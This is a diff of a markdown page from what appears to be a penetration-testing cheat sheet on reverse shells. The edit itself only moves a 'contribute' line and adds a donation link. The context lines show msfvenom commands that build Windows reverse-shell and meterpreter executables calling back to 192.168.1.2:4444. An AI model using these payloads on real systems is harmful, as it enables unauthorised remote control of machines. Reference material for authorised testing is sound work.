@@ -6,6 +6,8 @@ Hack Responsibly.
 Always ensure you have **explicit** permission to access any computer system **before** using any of the techniques contained in these documents.  You accept full responsibility for your actions by applying any knowledge gained here.  
 {% endhint %}
 
+Not much here yet...please feel free to contribute at [https://www.github.com/zweilosec](https://github.com/zweilosec)
+
 ## **Reverse Shells**
 
 TODO: description and methodology for each section \(as needed\); Fix code examples so they can be used for scripting
@@ -50,5 +52,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f exe > reve
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f exe > reversetcp.exe
 ```
 
-Nothing here yet...please feel free to contribute at [https://www.github.com/zweilosec](https://github.com/zweilosec)
+
+
+If you like this content and would like to see more, please consider [buying me a coffee](https://www.buymeacoffee.com/zweilosec)!
 
